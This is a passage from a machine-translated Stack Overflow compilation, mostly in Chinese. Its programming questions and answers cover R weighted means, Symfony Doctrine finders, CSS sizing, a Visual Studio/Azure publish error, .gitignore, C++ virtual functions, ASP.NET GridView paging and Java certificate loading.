这些样式透明层。更改以适合您的口味。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T00:21:25.160

像[jCarousel](http://sorgalla.com/projects/jcarousel/)这样的东西应该可以解决问题。一旦有了轮播功能，就可以通过 CSS 和包含标题的 span 添加悬停效果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T09:12:33.587

我只是在看基于 JavaScript 的[**ContentFlow 插件。**](http://www.jacksasylum.eu/ContentFlow/index.php)

它们包括一个单独的附加插件库，您可以使用它来满足您的幻灯片需求，特别是[**这里**](http://www.jacksasylum.eu/ContentFlow/addons.php#ContentFlow_carousel)的这个。当您在 3 个图像上使用鼠标滚轮时，它会滚动 1。也就是说，您可以修改插件以在单击箭头按钮时执行相同的操作。

示例插件标记如下所示：

```
{
  shownItems: 3,    //number of visible items
  showCaption: true // show item caption
  width: 100,       // relative item width
  height: 100,      // relative item height
  space: 0.4        // relative item spacing
} 
```

为了解决标题仅在鼠标悬停时可见的问题，我会将 showCaption 设置为始终为真，同时使用将在需要时使用标题类名称的 jQuery事件侦听`.hover();`器。此外，使用 jQuery 设置不透明度也可以在事件中完成。`.show();``.hide();``.caption``.hover();`

如果需要，最新版本的**ContentFlow v1.0.2**支持同一网页上的多个实例。

# r - 如何计算R中的加权平均值？

> ID：10989032
> 
> 赞同：22
> 
> 时间：2012-06-12T00:06:28.123
> 
> 标签：r

如何计算加权平均值`R`？

例如，我有 4 个元素，其中 1 个元素的大小（或：长度、宽度等）为 10，3 个元素的大小为 2。

```
> z = data.frame(count=c(1,3), size=c(10,2))
> z
  count size
1     1   10
2     3    2 
```

加权平均值为`(10 * 1 + 2 * 3) / 4 = 4`。

* * *

## 回答 #1

> 赞同：39
> 
> 时间：2012-06-12T00:06:28.873

使用`weighted.mean`：

```
> weighted.mean(z$size, z$count)
[1] 4 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2012-06-12T00:18:15.163

似乎您已经知道如何计算它，只需要朝着正确的方向轻推即可实现它。由于 R 是矢量化的，这非常简单：

```
with(z, sum(count*size)/sum(count)) 
```

该`with`位只是节省打字，相当于`sum(z$count*z$size)/sum(z$count)`

`weighted.mean()`或者使用您还指出的内置功能。使用您自己的函数可以证明更快，但不会像内置函数那样进行相同数量的错误检查。

```
builtin <- function() with(z, weighted.mean(count, size))
rollyourown <- function() with(z, sum(count*size)/sum(count))

require(rbenchmark)  
  benchmark(builtin(), rollyourown(),
            replications = 1000000,
            columns = c("test", "elapsed", "relative"),
            order = "relative")
#-----
           test elapsed relative
2 rollyourown()   13.26 1.000000
1     builtin()   22.84 1.722474 
```

# symfony1 - symfony学说中的多个findby

> ID：10989047
> 
> 赞同：2
> 
> 时间：2012-06-12T00:08:47.950
> 
> 标签：symfony1, doctrine, findby

我需要知道是否有办法做这样的事情：

```
$customerClient = $clientTable->findByCustomerNumber($this->array_data[$rowIndex]['D']);
$customerClient = $customerClient->findOneByEmpCartera($portfolio); 
```

我收到此错误消息

> 调用未定义的方法 Doctrine_Collection::findOneByEmpCartera()

我需要在`$clientTable`对象表中做 2 个过滤器，

任何建议都会对我有用。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T16:43:59.877

Symfony 1.4 实际上可以一次性处理多个字段，但是你应该如何使用这个功能这太荒谬了

```
Doctrine::getTable('MtCheck')->findOneBy('idAndc_type', array($id,$type)) 
```

在哪里表

```
CREATE TABLE `mt_check` (
  `id` int(11) NOT NULL,
  `c_type` int(11) NOT NULL,
  `c_ver` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`,`c_type`),
) ENGINE=InnoDB DEFAULT CHARSET=utf8; 
```

您可以使用精确的“与”或“或”，前后不能有空格。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-06-12T06:17:22.283

你不能这样。

一个`findBy*`方法总是返回一个`Doctrine_Collection`. 并且`findBy*`需要从`Table`对象调用方法。

您可以在一个自定义中做到这一点`findBy`，在您的`ClientTable`：

```
 // you may update relation and/or table name
  public function findOneCustomerByEmpCartera($customer_member, $portfolio)
  {
    $q = $this->createQuery()
      ->from('Client cl')
      ->leftJoin('cl.Customer cu');
      ->where('cl.customer_number = ? AND cu.emp_cartera', array($customer_member, $portfolio));

    return $q->limit(1)->execute()->getFirst();
  } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T17:50:03.950

Radanmanf 的回答帮助我轻松解决了我的问题。根据问题，以下也应该有效。

> Doctrine::getTable('MtCheck')->findOneByIdAndCType($id,$type);

注意这里的区别。没有 array() 作为参数传递。只是价值观。

我尝试了这两种方法，都对我有用。

进一步解释 [DQL: DOctrine Query Language: Magic Finders](http://docs.doctrine-project.org/projects/doctrine1/en/latest/en/manual/dql-doctrine-query-language.html#magic-finders)

# html - setting globals in html or body

> ID：10989049
> 
> 赞同：5
> 
> 时间：2012-06-12T00:00:14.697
> 
> 标签：html, css

I have some questions regarding the following css that I found:

```
html, body {
    height:100%;
    min-width:100%;
    position:absolute;
}

html {
    background: none repeat scroll 0 0 #fff;
    color:#fff;
    font-family:arial,helvetica,sans-serif;
    font-size:15px;
} 
```

1.  is it necessary to have height and min-width to 100% on the html and body? What's the benefit?
2.  what is the reason for using position absolute?
3.  why did they set the background/color/font on the html and not the body? Is there a difference? Or is it just preference?

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T00:30:53.413

1.  通常是不必要的。但是，有时您可能需要它。例如，也许您的基本/站点范围的网站 css 文件指定了不同的大小（您知道那些边只是边框的站点，通常是博客？这些宽度已被缩小）。请注意，当您有百分比时，它属于父容器。所以 Div A 可能有`width: 100%`，但如果它的父容器有`width: 500px`Div A 将有 100% 的 500px。

2.  `position: absolute`我能想到的 html + body 上没有任何理由。绝对定位的一个副作用是元素不再与其他元素“浮动内联”（不确定您将如何描述/措辞）。

    例如，`position: relative`忽略绝对定位的元素。因此，如果您有 Image A （绝对）和 Image B （相对）并且 B 有`left: 10px;`，则 Image B 将从父级的左侧偏移，而不是 A 本来的位置。希望我在这里有意义。

    所以有时我只要有背景图像就设置“位置：绝对”。如果它是第一个孩子，它的所有东西都会显示在它上面（因为新元素是“添加到顶部”并忽略绝对定位的元素）。

3.  身体将继承这些属性，所以是的，这只是偏好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-12T00:28:45.823

将元素的宽度或高度设置为 100% 仅在其父元素也为该尺寸的 100% 时才有效。这意味着如果 body 甚至 html 标签由于某种原因不是高度或宽度的 100%，则其中具有这些属性的元素将具有 0 高度或宽度。

例如：http: [//jsfiddle.net/KZaum/](http://jsfiddle.net/KZaum/)

# azure - Why do I get the error "The target GatherAllFilesToPublish does not exist"?

> ID：10989051
> 
> 赞同：81
> 
> 时间：2012-06-12T00:09:07.030
> 
> 标签：azure, visual-studio-2010

I have recently installed the new Azure development tools for Visual Studio 2010 service pack 1\. Every time that I try to publish an existing website (using file system deployment) I get the following error:

> The target "GatherAllFilesToPublish" does not exist in the project.

Can anyone tell me what I am missing?

Thanks

* * *

## 回答 #1

> 赞同：83
> 
> 时间：2012-06-22T21:28:29.483

我想我知道问题是什么。当您安装 Azure SDK 位时，它会安装一些 VS Web Publish 更新。其中之一将文件更新为

```
C:\Program Files (x86)\MSBuild\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets 
```

根据我们的设置是如何定义的，如果该文件具有更新的时间戳（无论出于何种原因），那么当您安装新组件时，该文件不会得到更新。

要解决此问题，您应该能够按照以下步骤操作：

*   重命名`Microsoft.WebApplication.targets`为`Microsoft.WebApplication.targets.bak`
*   [使用http://go.microsoft.com/fwlink/?LinkId=253458](http://go.microsoft.com/fwlink/?LinkId=253458)上的 exe 安装/修复

* * *

## 回答 #2

> 赞同：74
> 
> 时间：2014-01-31T10:46:24.173

我遇到了这个问题，并通过添加：

```
<Target Name="GatherAllFilesToPublish">
</Target> 
```

到项目文件。

* * *

## 回答 #3

> 赞同：45
> 
> 时间：2014-02-26T22:49:44.203

这对我[有用 - 收集所有文件以发布错误](http://dl.my/2013/gatherallfilestopublish-error-in-upgraded-vs2012-projects/)

1.  右键单击项目并选择编辑（项目名称）.csproj。（例如在记事本中编辑）
2.  寻找`<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />`
3.  在该行上方添加以下内容。

    ```
    <PropertyGroup> 
     <VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">13.0</VisualStudioVersion>
     <VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
    </PropertyGroup> 
    ```

4.  保存并重新加载项目。

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2018-07-11T17:50:44.007

我在 VS 2017 中遇到了这个问题，我尝试按照这里的建议手动更改 csproj 文件，但没有一个建议的修复对我有用。我遇到了这个 nuget 包。安装它对我有用。

[MSBuild.Microsoft.VisualStudio.Web.targets](https://www.nuget.org/packages/MSBuild.Microsoft.VisualStudio.Web.targets/)

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2012-07-03T19:34:45.047

删除这些安装为我解决了这个问题：

*   Microsoft Web Publish - Visual Web Developer Express 2010
*   Microsoft Web 发布 - Visual Studio 2010

[参考](http://social.msdn.microsoft.com/forums/da-%20dk/windowsazuredevelopment/thread/116d3562-99fb-45b0-acf9-b35bc393682e/)

* * *

## 回答 #6

> 赞同：8
> 
> 时间：2018-07-04T06:29:21.620

VS2017同样的问题。你可以试试这个，它对我有用。

1.  卸载项目并编辑 csproj 文件
2.  搜索关键字“WebApplication.targets”

    ```
     <Import Project="...\WebApplications\Microsoft.WebApplication.targets" ... > 
    ```

    评论或删除这一行。（可能两行取决于“条件”）

3.  保存并重新加载项目

在这一步，它会提示你安装一些大约 500M 的包...

之后，重新加载项目，然后它就可以工作了！

我想我只是在安装 VS 2017 时错过了一些组件。

我还注意到 VS2017 中的 MSBuild 路径完全不同，但这可能与问题无关，因为它在 csproj 文件中使用相对路径。

* * *

## 回答 #7

> 赞同：5
> 
> 时间：2013-09-26T04:49:42.340

当我想将我的 ASP.Net 应用程序发布到 Windows Azure 时，我遇到了类似的问题。经过多次反复试验，最终[这个](http://dotnetexpress.com/dne_postst/18/error-MSB4057-The-target-PipelineTransformPhase-does-not-exist-in-the-project.aspx)解决方案对我有用。这不需要任何文件重命名或任何安装/重新安装修补程序/补丁。这是你必须做的：

在写字板/记事本中打开 ASP.Net 项目文件 (.csproj) 并找到与此类似的行：

```
<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="'$(Solutions.VSVersion)' == '8.0'" /> 
```

将其替换为如下所示的行：

```
<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" /> 
```

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2015-09-10T08:30:47.643

我在一个老问题中意识到了这一点，但我最近遇到了它，这就是我解决它的方法。

背景：我有一个旧项目升级到 VS studio 13。看起来项目文件没有正确升级。

在 csproj 文件中有对 VS v10.0 的引用，但我运行的是真正的“v12.0”的 VS 13。

所以我告诉 csproj 文件使用“v12.0”文件夹，而不是“v10.0”文件夹。

这就是我所拥有的：

```
<PropertyGroup>
  <VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">10.0</VisualStudioVersion>
  <VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
</PropertyGroup>
<Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
<Import Project="$(SolutionDir)\..\BuildTools\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" />
<Import Project="$(SolutionDir)\..\BuildTools\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="false" /> 
```

这就是我将其更改为：

```
<PropertyGroup>
  <VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">12.0</VisualStudioVersion>
  <VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
</PropertyGroup>
<Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
<Import Project="$(VSToolsPath)\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" /> 
```

现在我发布到文件系统的工作正常！

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2012-06-25T02:44:41.380

我遇到了类似的问题，并通过使用 Sayed 提供的步骤解决了它。

我重命名的文件虽然在 v10.0 目录中。

`C:\Program Files (x86)\MSBuild\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets.`

那里的原始文件日期为 2011 年 1 月 18 日，在使用 .bak 扩展名重命名它然后重新安装 KB2591016 后，发布似乎再次正常工作。文件 Microsoft.WebApplication.targets 的新日期现在是 2011 年 8 月 11 日。

* * *

## 回答 #10

> 赞同：3
> 
> 时间：2015-12-17T10:12:19.290

我一直在努力解决与 Visual Studio 2013（和 2015）相同的问题。

对我来说，关键的解决方法是添加`VSToolsPath`我的项目文件中缺少的属性设置，无论出于何种原因。

我将此添加到`<PropertyGroup>`指令中：

```
<VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath> 
```

附带说明：我的项目文件也引用了该`Microsoft.WebApplication.targets`文件的 v10.0 版本，但这似乎没问题。

* * *

## 回答 #11

> 赞同：2
> 
> 时间：2014-07-25T12:07:29.640

我有同样的错误。不知何故，这条线不见了。

```
<Import Project="$(VSToolsPath)\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" /> 
```

在下面添加它

```
<Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" /> 
```

现在工作正常

* * *

## 回答 #12

> 赞同：2
> 
> 时间：2015-03-10T12:48:17.437

我在 VS2013 中遇到了同样的问题，我找到的解决方案是通过创建一个新的空 Web 应用程序项目，可以将以下行从中复制到我的旧网站项目中： 在顶部：

```
<Project ToolsVersion="12.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />

<PropertyGroup>
    <VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">10.0</VisualStudioVersion>
    <VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
  </PropertyGroup>
  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
  <Import Project="$(VSToolsPath)\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" />
  <Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="false" /> 
```

* * *

## 回答 #13

> 赞同：2
> 
> 时间：2017-09-14T06:57:10.200

对于 Visual Studio 2017 - 它应该添加到 .csproj 文件中的块之后，使用记事本并查找“.targets”来定位它...

我创建了一个新的 VS 2017 项目，这对我有用（没有警告）：

```
 <PropertyGroup>
    <VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">10.0</VisualStudioVersion>
    <VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
  </PropertyGroup>
  <Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
  <Import Project="$(VSToolsPath)\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" />
  <Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="false" />
  <Target Name="MvcBuildViews" AfterTargets="AfterBuild" Condition="'$(MvcBuildViews)'=='true'">
    <AspNetCompiler VirtualPath="temp" PhysicalPath="$(WebProjectOutputDir)" />
  </Target> 
```

* * *

## 回答 #14

> 赞同：2
> 
> 时间：2015-12-23T11:11:29.573

右键单击项目并选择编辑（项目名称）.csproj。（例如，在记事本中编辑）在该行上方查找添加以下内容。

13.0 $(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion) 保存并重新加载项目。

这对我真的有用，谢谢

* * *

## 回答 #15

> 赞同：2
> 
> 时间：2019-12-17T13:43:44.940

我遇到了同样的问题：我在 中创建了项目`VS 2010`，并且必须从`VS 2019`. 这里没有一个解决方案对我有用，而且我已经解决了这个问题大约一天。

什么工作来自这个链接： http: [//www.dotnetxp.com/visual-studio-error-publish-target-gatherallfilestopublish-not-exist-project/](http://www.dotnetxp.com/visual-studio-error-publish-target-gatherallfilestopublish-not-exist-project/)

这就是我所做的：

** 卸载违规项目。

** 在文本编辑器中打开 csproj 文件。

** 找到这一行

```
<Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" /> 
```

并用这个替换。我使用`16.0`是因为那是我正在使用的版本（vs2019）。

```
<PropertyGroup>
<VisualStudioVersion Condition="'$(VisualStudioVersion)' == ''">16.0</VisualStudioVersion>
<VSToolsPath Condition="'$(VSToolsPath)' == ''">$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v$(VisualStudioVersion)</VSToolsPath>
</PropertyGroup>
<Import Project="$(MSBuildBinPath)\Microsoft.CSharp.targets" />
<Import Project="$(VSToolsPath)\WebApplications\Microsoft.WebApplication.targets" Condition="'$(VSToolsPath)' != ''" />
<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v16.0\WebApplications\Microsoft.WebApplication.targets" Condition="false" /> 
```

** 重新加载项目并发布。

像魅力一样工作。

* * *

## 回答 #16

> 赞同：1
> 
> 时间：2013-09-12T04:29:40.890

Sayed 的解决方案在我使用 VS2012 升级的项目中不起作用。但这有效[_](http://dl.my/2013/gatherallfilestopublish-error-in-upgraded-vs2012-projects/)

* * *

## 回答 #17

> 赞同：1
> 
> 时间：2014-03-10T22:55:54.513

如果在 VS2012 (Visual Studio 2012) 中编辑 VS2010 项目，试试这个。从以下位置编辑 csproj 文件：

```
<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" /> 
```

并更改为：

```
<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v11.0\WebApplications\Microsoft.WebApplication.targets" /> 
```

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2012-06-12T11:06:03.783

由于我无法重现该问题，因此建议您尝试重新安装 SDK。

请在安装新 SDK 之前尝试完全删除旧 SDK。

此致，

明旭。

* * *

## 回答 #19

> 赞同：0
> 
> 时间：2018-03-01T15:54:40.527

我已经修复了同样的问题。请检查解决方案中是否缺少某些文件。如果您遇到错误，`Error - The target "GatherAllFilesToPublish" does not exist in the project.`则只需打开 .proj 文件并删除此行`<Import Project="$(MSBuildExtensionsPath32)\Microsoft\VisualStudio\v10.0\WebApplications\Microsoft.WebApplication.targets" Condition="false" />`

您将实际错误或那些丢失的文件放入解决方案

# git - .DS_Store in .gitignore: unnecessary?

> ID：10989060
> 
> 赞同：0
> 
> 时间：2012-06-12T00:10:51.247
> 
> 标签：git, gitignore

I've read about people adding .DS_Store to their .gitignore files, but I did a quick test using Git 1.7.6 and I'm not sure it's even necessary. What do you think?

```
johndoe@John-Does-MacBook-Pro:~$ mkdir test
johndoe@John-Does-MacBook-Pro:~$ cd test/
johndoe@John-Does-MacBook-Pro:~/test$ git init
Initialized empty Git repository in /Users/johndoe/test/.git/
johndoe@John-Does-MacBook-Pro:~/test$ touch foo.txt
johndoe@John-Does-MacBook-Pro:~/test$ touch .DS_Store
johndoe@John-Does-MacBook-Pro:~/test$ touch bar.txt
johndoe@John-Does-MacBook-Pro:~/test$ touch .DS_Store2
johndoe@John-Does-MacBook-Pro:~/test$ git status
# On branch master
#
# Initial commit
#
# Untracked files:
#   (use "git add <file>..." to include in what will be committed)
#
#   .DS_Store2
#   bar.txt
#   foo.txt
nothing added to commit but untracked files present (use "git add" to track)
johndoe@John-Does-MacBook-Pro:~/test$ git config -l
user.name=John Doe
user.email=johndoe@example.com
color.ui=true
core.editor=mate -w
core.repositoryformatversion=0
core.filemode=true
core.bare=false
core.logallrefupdates=true
core.ignorecase=true 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T03:00:44.183

我对 git 的整个源代码进行了递归 grep，除了 git-gui 目录的 .gitignore 之外，没有看到对“.DS_Store”的任何引用。

这意味着 git 不会自动忽略该文件（除非它在 ​​git 的 MacOS 版本中进行了特殊修补或类似的奇怪东西）。

可能它为您忽略它的原因可能是您在全局忽略中拥有它。

# c++ - How to call virtual functions from statically allocated objects?

> ID：10989062
> 
> 赞同：0
> 
> 时间：2012-06-12T00:11:03.723
> 
> 标签：c++, virtual-functions

Let's say I have a base class 'A' and two classes 'B' and 'C', which are derived from the base class 'A'

I know I can do this

```
A *a = new B();
or
A *a = new C();
a->handle() //handle is a virtual function in A. class B and C overloaded this function and added its own implementation. 
```

Then it will call the handle function from either B or C object.

But, I have a restriction that I cannot use a pointer in my program. I have to define A as

```
A a //not A *a 
```

Then how do I implement this so that it calls the handle function from class B or C?

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T00:16:13.870

你不能。你不能取一个类型的值`A`并假装它是一个`B`. 这很糟糕，而且无法做到。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T00:23:37.327

奇怪的问题。它不能。不是以任何理智的方式。毕竟是'A'。

假设您知道“我想调用 C 的 virt”，您可能会做一些令人不安的事情，例如：

```
#include <stdio.h>

class A { public: virtual int foo() { return 1; } };
class B : public A{ public: virtual int foo() { return 2; } };
class C : public A{ public: virtual int foo() { return 3; } };

int main()
{
    A a;
    C *c = (C*)&a;
    int x = c->C::foo();  // EXAMPLE 1
    printf("x == %d\n", x);

    x = ((C&)a).C::foo(); // EXAMPLE 2

    printf("x == %d\n", x);
    return 0;
} 
```

请注意，示例 2 是一样的，中间没有任何内容。更难阅读，但结果相同。

关键是使用 C::foo(); 如果没有 C::，您将通过虚拟表，结果将为 '1'。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T00:21:00.053

如果这是家庭作业，那么教授可能打算使用引用 (&) 而不是纯指针 (*)。

```
A &a = * new B();
or
A &a = * new C();
a.handle() 
```

尽管 C++ 中的引用与常规指针几乎相同。

# java - why is native c faster than java in android development

> ID：10989064
> 
> 赞同：-3
> 
> 时间：2012-06-12T00:11:08.383
> 
> 标签：java, c, android-ndk, native-code

I've read some articles about Android NDK. Most of them claim Native C is faster than Java but they didn't explain the reasons. Could anybody explain and give sources why is Native C faster?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:21:20.620

Java 必须由虚拟机解释，而 C 直接与系统通信。问题是，由于必须解释 java，因此您可以说它在执行某些操作时必须通过检查点，而 C 具有直接通过。但是那个虚拟机也有一些优势。例如，它允许代码几乎可以在任何系统上运行。相比之下，C 依赖于机器。

# git - Mac 版 Github 未在代码源上显示差异

> ID：10989065
> 
> 赞同：4
> 
> 时间：2012-06-12T00:11:11.757
> 
> 标签：git, github-for-mac

我已经使用 GitHub for Mac 大约一周左右，并取得了巨大的成功。但是，在自动更新到 1.2.8 版本后，github 将不再在 .m 文件上为我显示差异：

![在此处输入图像描述](../Images/74edd2a5303a71201b1dbbda722a9ef7.png)

它似乎会比较其他文件，例如，一个 .pbxproj 文件：

![在此处输入图像描述](../Images/9230b0d1173b69c1f8b5d47de632b550.png)

我有一种暗示，任何决定可以和不能比较的地方意外地切换到认为 .m 和 .h 文件不可比较。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-20T09:05:03.400

从 Github for Mac 1.2.10 开始，此问题已得到修复。请更新您的客户。

# c# - Grid View 绑定到 SqlDataSource 创建分页麻烦

> ID：10989069
> 
> 赞同：0
> 
> 时间：2012-06-12T00:12:52.230
> 
> 标签：c#, asp.net, visual-studio-2010, asp.net-4.0

我正在使用 C#、.net 4 开发一个 Web 应用程序。我有一个绑定到 SqlDataSource 的网格视图。这个数据源大约有超过一千万条记录。这是因为，我允许分页。我在同一页面上有一个过滤条件。用户使用复选框选择选项。然后在过滤按钮事件中，我编写了一些代码，根据 SqlDataSource 的过滤选项构建一个新的 SELECT 命令。在建立一个新的查询之后。我写了另一行代码：

DataGridView.SelectCommand=过滤查询；

因此，当用户单击 FilterButton 时，gridview 会显示过滤后的数据。正如我告诉你的，我已经允许分页。因此，过滤后，当我选择该网格视图的下一个按钮时，它会显示整个数据而不是过滤后的数据。我认为这是因为它根据 SqlDataSource 的预定义 SELECT 命令回发页面并绑定网格视图。

我尝试了很多方法。我使用静态布尔变量来跟踪 page_load 事件。那么它工作正常。但是当我从一页导航到另一页时它仍然很麻烦。当我回到这个页面时，它仍然显示过滤后的数据。

我的时间非常少。请尽快指导我。请记住，我对点网技术完全陌生。因此，任何详细的指导都将受到高度赞赏。谢谢。

最好的祝福！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T00:24:59.547

您必须创建 OnPageIndex Changed 事件

```
<asp:GridView ID="yourGrid" runat="server" AutoGenerateColumns="false" OnPageIndexChanged="yourGrid_PageIndexChanged"> 
```

在后面的代码中

```
protected void yourGrid_PageIndexChanged(object sender, EventArgs e)
{
    if (filtered) // you would have to keep track of the filtered state of your grid possibly with hidden field
    {
        DataGridView.SelectCommand = FilteredQuery;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T04:49:40.083

SQLDATASOURCE 不会以这种方式工作。在每次页面更改时，您都需要重新创建 sql 查询。尝试在每次页面更改时跳过某些行。

这是一个给你的例子。

**第 页 - 1**

```
SELECT * FROM (
  SELECT
    ROW_NUMBER() OVER (ORDER BY YOURKEY desc) AS rownumber,
    *
  FROM YOURTABLE
) AS ANYTHING
WHERE rownumber >= STARTING ROW and rownumber <= ENDINGROW 
```

* * *

**例如**

```
 SELECT * FROM (
      SELECT
        ROW_NUMBER() OVER (ORDER BY bowzer_id desc) AS rownumber,
        *
      FROM Bowzer
    ) AS BowzerTable
    WHERE rownumber >= 10 and rownumber <= 20 
```

**第 2 页**

```
SELECT * FROM (
  SELECT
    ROW_NUMBER() OVER (ORDER BY bowzer_id desc) AS rownumber,
    *
  FROM Bowzer
) AS BowzerTable
WHERE rownumber >= 20 and rownumber <= 30 
```

**第 页 - 3**

```
SELECT * FROM (
  SELECT
    ROW_NUMBER() OVER (ORDER BY bowzer_id desc) AS rownumber,
    *
  FROM Bowzer
) AS BowzerTable
WHERE rownumber >= 30 and rownumber <= 40 
```

您需要在每次页面更改时重新创建 SQL 查询，如上例所示。

# java - 获取证书对象出错

> ID：10989075
> 
> 赞同：1
> 
> 时间：2012-06-12T00:14:05.817
> 
> 标签：java, security, spring-security, certificate, x509

```
import java.security.cert.Certificate;
import java.security.cert.CertificateFactory;
import org.junit.Test;

public class TrustManagerTest {
    @Test
    public void testTrust() throws Exception
    {
        System.out.println("done 0");
        Certificate cert = CertificateFactory.getInstance("X509").generateCertificate(getClass().getResourceAsStream("Resources/certificate.cer"));
        System.out.println("done 1");
    }
} 
```

我检查了 certificate.cer 文件的内容，它确实包含证书。在创建证书对象时，我遇到了以下异常。知道我哪里出错了吗？

```
java.security.cert.CertificateException: Missing input stream
    at sun.security.provider.X509Factory.engineGenerateCertificate(Unknown Source)
    at java.security.cert.CertificateFactory.generateCertificate(Unknown Source)
    at com.manh.msf.rest.auth.TrustManagerTest.testTrust(TrustManagerTest.java:13)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
    at java.lang.reflect.Method.invoke(Unknown Source)
    at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:44)
    at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:15)
    at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:41)
    at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:20)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
    at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:73)
    at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:46)
    at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:180)
    at org.junit.runners.ParentRunner.access$000(ParentRunner.java:41)
    at org.junit.runners.ParentRunner$1.evaluate(ParentRunner.java:173)
    at org.junit.internal.runners.statements.RunBefores.evaluate(RunBefores.java:28)
    at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:31)
    at org.junit.runners.ParentRunner.run(ParentRunner.java:220) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T00:16:26.613

是的。

```
getResourceAsStream("Resources/certificate.cer") 
```

如果 的父目录`/Resources`不在您的 中`CLASSPATH`，`getResourceAsStream`则将返回`null`.

这对我很有效：

```
public class ClassLoaderDemo {
    public static void main(String[] args) {
        try {
            ClassLoader classLoader = ClassLoaderDemo.class.getClassLoader();
            if (classLoader != null) {
